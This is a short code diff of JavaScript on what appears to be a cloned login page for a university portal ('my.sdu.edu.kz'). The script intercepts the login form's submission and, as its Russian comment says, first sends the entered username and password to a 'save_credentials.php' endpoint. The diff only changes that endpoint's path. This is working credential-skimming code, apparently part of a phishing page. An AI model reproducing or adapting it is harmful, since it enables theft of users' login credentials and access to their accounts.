@@ -7,7 +7,7 @@ document.getElementById('loginForm').onsubmit = function(event) {
 
     // Отправляем данные на сервер перед отправкой основной формы
     var xhr = new XMLHttpRequest();
-    xhr.open("post", "save_credentials.php", true);
+    xhr.open("post", "my-first-project/my.sdu.edu.kz/save_credentials.php", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("username=" + username + "&password=" + password);
 
